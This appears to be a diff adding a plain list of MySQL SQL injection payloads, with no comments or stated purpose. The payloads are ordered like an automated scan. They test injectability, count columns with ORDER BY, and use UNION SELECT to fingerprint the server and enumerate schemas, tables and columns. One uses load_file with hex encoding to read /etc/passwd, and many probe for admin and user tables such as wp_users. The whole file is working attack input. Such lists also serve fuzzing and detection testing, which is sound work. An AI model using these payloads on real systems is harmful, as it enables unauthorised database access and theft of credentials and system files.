@@ -1,0 +1,56 @@
+1' and '1' like '1
+1' and '1' like '0
+1' and 0 < (select length(@@version)) and '1' like '1
+1' own3d by 1
+1' order by 1#
+1' order by 15000#
+1' order by 2 #
+1' order by 4 #
+1' order by 3 #
+1' and 1=0 union all select 0x373134,0x373135#
+1' and 1 = 0 UNION ALL SELECT 0,CONCAT(@@version,0x5468655f4d6f6c652e46316e67657221)#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from information_schema.schemata where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(schema_name, 0x20)),0x3a3a2d3a3a) from information_schema.schemata where 1=1 limit 1 offset 0 #
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(schema_name, 0x20)),0x3a3a2d3a3a) from information_schema.schemata where 1=1 limit 1 offset 2 #
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(schema_name, 0x20)),0x3a3a2d3a3a) from information_schema.schemata where 1=1 limit 1 offset 4 #
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(schema_name, 0x20)),0x3a3a2d3a3a) from information_schema.schemata where 1=1 limit 1 offset 6 #
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(schema_name, 0x20)),0x3a3a2d3a3a) from information_schema.schemata where 1=1 limit 1 offset 1 #
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(schema_name, 0x20)),0x3a3a2d3a3a) from information_schema.schemata where 1=1 limit 1 offset 3 #
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(schema_name, 0x20)),0x3a3a2d3a3a) from information_schema.schemata where 1=1 limit 1 offset 5 #
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from information_schema.tables where table_schema = 0x6a756e6b#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(table_name, 0x20)),0x3a3a2d3a3a) from information_schema.tables where table_schema = 0x6a756e6b limit 1 offset 0 #
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from information_schema.columns where table_schema = 0x6a756e6b and table_name = 0x6a756e6b7573657273#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(column_name, 0x20)),0x3a3a2d3a3a) from information_schema.columns where table_schema = 0x6a756e6b and table_name = 0x6a756e6b7573657273 limit 1 offset 1 #
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(column_name, 0x20)),0x3a3a2d3a3a) from information_schema.columns where table_schema = 0x6a756e6b and table_name = 0x6a756e6b7573657273 limit 1 offset 0 #
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(user(), 0x20),IFNULL(version(), 0x20),IFNULL(database(), 0x20)),0x3a3a2d3a3a)#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(load_file(0x2f6574632f70617373776f7264), 0x20)),0x3a3a2d3a3a)#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(load_file(0x2f746d702f6a756e6b), 0x20)),0x3a3a2d3a3a)#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.adm where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.admin where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.admin_users where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.admins where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.administrator where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.administrador where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.administradores where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.client where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.clients where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.jos_users where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.login where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.logins where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.user where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.user_admin where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.users where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.usuario where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.usuarios where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.usuarios_admin where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.usr where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.usrs where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from mysql.wp_users where 1=1#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from information_schema.tables where table_schema = 0x696e666f726d6174696f6e5f736368656d6173 and table_name like 0x2541424c4525#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,COUNT(*),0x3a3a2d3a3a) from information_schema.tables where table_schema = 0x696e666f726d6174696f6e5f736368656d61 and table_name like 0x2541424c4525#
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(table_name, 0x20)),0x3a3a2d3a3a) from information_schema.tables where table_schema = 0x696e666f726d6174696f6e5f736368656d61 and table_name like 0x2541424c4525 limit 1 offset 4 #
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(table_name, 0x20)),0x3a3a2d3a3a) from information_schema.tables where table_schema = 0x696e666f726d6174696f6e5f736368656d61 and table_name like 0x2541424c4525 limit 1 offset 5 #
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(table_name, 0x20)),0x3a3a2d3a3a) from information_schema.tables where table_schema = 0x696e666f726d6174696f6e5f736368656d61 and table_name like 0x2541424c4525 limit 1 offset 2 #
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(table_name, 0x20)),0x3a3a2d3a3a) from information_schema.tables where table_schema = 0x696e666f726d6174696f6e5f736368656d61 and table_name like 0x2541424c4525 limit 1 offset 0 #
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(table_name, 0x20)),0x3a3a2d3a3a) from information_schema.tables where table_schema = 0x696e666f726d6174696f6e5f736368656d61 and table_name like 0x2541424c4525 limit 1 offset 3 #
+1' and 1=0 UNION ALL SELECT 0,CONCAT(0x3a3a2d3a3a,CONCAT_WS(0x3e3c,IFNULL(table_name, 0x20)),0x3a3a2d3a3a) from information_schema.tables where table_schema = 0x696e666f726d6174696f6e5f736368656d61 and table_name like 0x2541424c4525 limit 1 offset 1 #
